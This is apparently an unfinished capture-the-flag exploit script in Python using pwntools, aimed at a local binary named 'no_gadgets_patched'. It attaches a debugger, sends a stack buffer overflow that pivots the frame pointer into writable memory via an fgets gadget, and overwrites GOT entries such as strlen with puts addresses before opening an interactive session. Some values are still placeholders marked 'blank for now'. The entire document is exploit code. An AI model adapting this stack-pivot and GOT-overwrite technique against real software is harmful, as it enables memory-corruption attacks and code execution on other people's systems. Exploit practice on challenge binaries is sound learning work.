#!/usr/bin/python3
from pwn import *

e = ELF("./no_gadgets_patched")
libc = ELF("./libc.so.6")
p = e.process()

leave_ret = e.sym.main+157
fgets_gadget = e.sym.main+68


gdb.attach(p,gdbscript='''
           b*0x0000000000401275
           ''')
input()

overflow  = b"\x00".ljust(0x80, b"A")
overflow += p64(0x404080+0x80)
overflow += p64(fgets_gadget)
p.sendline(overflow)



fake_rbp_rip  = p64(0xdead) + p64(0xbeef)     # blank for now!
fake_rbp_rip  = fake_rbp_rip.ljust(0x80, b"A")
fake_rbp_rip += p64(0x404000+0x80)
fake_rbp_rip += p64(fgets_gadget)
p.sendline(fake_rbp_rip)

overwrite  = p64(e.plt.puts + 6)
overwrite += p64(e.plt.puts)        # strlen@GOT
overwrite += p64(e.plt.printf + 6)
overwrite += p64(e.plt.fgets + 6)

p.sendline(overwrite)
p.interactive()
